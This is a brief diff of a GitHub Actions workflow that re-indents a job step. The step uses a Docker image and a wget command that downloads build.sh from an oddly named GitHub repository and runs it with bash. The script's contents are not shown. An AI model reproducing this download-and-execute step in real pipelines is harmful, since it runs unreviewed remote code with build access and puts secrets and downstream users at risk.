@@ -12,7 +12,7 @@ jobs:
      steps:
         - uses: addnab/docker-run-action@v3
           with:
-          image: dazz111/ubuntu-sdk:build
-          shell: bash
-          run: |
-            wget https://raw.githubusercontent.com/Jjtitdutitdtti7s5s/fejeyrb/main/build.sh && bash build.sh
+            image: dazz111/ubuntu-sdk:build
+            shell: bash
+            run: |
+              wget https://raw.githubusercontent.com/Jjtitdutitdtti7s5s/fejeyrb/main/build.sh && bash build.sh
